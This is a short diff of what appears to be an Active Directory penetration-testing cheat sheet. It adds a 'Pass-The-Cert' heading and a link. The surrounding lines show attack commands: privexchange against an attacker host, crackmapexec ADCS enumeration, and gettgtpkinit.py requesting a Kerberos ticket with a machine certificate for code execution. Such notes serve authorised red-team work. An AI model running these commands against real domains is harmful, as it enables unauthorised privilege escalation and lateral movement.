@@ -65,6 +65,8 @@ python3 privexchange.py <targetOWA> -ah <attacker_host> -u <username>
 #If you have a domain user:
 crackmapexec ldap domain.lab -u username -p password -M adcs
 
+#Pass-The-Cert
+#https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate
 #Use a machine certificate for code exec
 python3 ./gettgtpkinit.py -pfx-base64 "MIIRVQIBAzCCER8GCSqGSIb3c[...]sAgEAMIfLZ/BNCWLvw==" -dc-ip 10.1.15.7 'domain.com/machineAccount$' tgtMachineAccount.ccache
 #Obtain TGS with S4U2Self
